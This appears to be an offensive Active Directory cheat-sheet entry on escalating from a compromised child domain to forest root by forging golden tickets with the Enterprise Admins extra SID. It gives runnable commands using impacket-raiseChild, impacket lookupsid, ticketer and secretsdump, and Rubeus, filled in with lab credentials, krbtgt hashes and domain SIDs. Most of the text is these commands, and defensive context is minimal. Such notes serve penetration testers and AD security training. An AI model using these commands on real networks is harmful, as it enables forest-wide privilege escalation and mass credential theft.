## Abusing infra-forest trust (SID filtering is disabled) [t-ad-trusts-infra_forest]

The main idea behind this attack is to createa golden ticket encrypted with the compromised krbtgt key with 
an exta SID (Enterprise Admin Group) inside it.


###  Forge a new ticket and add an extra SID




**option 1: impacket-raiseChild**

{% code overflow="wrap" %}
```bash
#The easiest automated way with impacket:
#It will forge a ticket with the Enterprise Admins extra SID. 
#Retrieving the SIDs, dumping the trusted domain's krbtgt, forging the ticket, dumping the forest root keys, etc.

impacket-raiseChild test.dev.hpbank.local/Administrator:'P@ssw0rd'

```
{% endcode %}


**option 2: impacket (manually)**

{% code overflow="wrap" %}
```bash
#lookupsid.py to retrieve the root and child domains SIDs
impacket-lookupsid hpbank.local/user:'P@ssw0rd'@dc01.hpbank.local
#S-1-5-21-748831818-4028602677-2506688269

impacket-lookupsid hpbank.local/user:'P@ssw0rd'@DC01TESTDEV.test.dev.hpbank.local
#S-1-5-21-3861238802-2101218565-754688495

#golden ticket with Enterprise Admins group RID
#impacket-ticketer -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-<RID>" "someusername"
#If SID filtering is disabled, set the RID to 519 to act as Enterprise Admin.
#If SID filtering is partially enabled, set the RID >=1000.

impacket-ticketer -nthash 7aa9208fb6f1d0da738cd4b798bd5f40 -domain-sid "S-1-5-21-3861238802-2101218565-754688495" -domain "test.dev.hpbank.local" -extra-sid "S-1-5-21-748831818-4028602677-2506688269-519" Administrator

KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pas -just-dc test.dev.hpbank.local/Administrator@DC01.hpbank.local

```
{% endcode %}


**option 3: Rubeus**

{% code overflow="wrap" %}
```bash
Rubeus.exe golden /rc4:7AA9208FB6F1D0DA738CD4B798BD5F40 /user:Administrator /id:500 /pgid:513 /domain:test.dev.hpbank.local /sid:S-1-5-21-3861238802-2101218565-754688495 /pwdlastset:"3/13/2023 11:23:22 AM" /minpassage:1 /maxpassage:42 /logoncount:19 /netbios:TEST /groups:544,512,520,513 /sids:S-1-5-21-748831818-4028602677-2506688269-519 /dc:DC01TESTDEV.test.dev.hpbank.local

#shorter version
Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

```
{% endcode %}

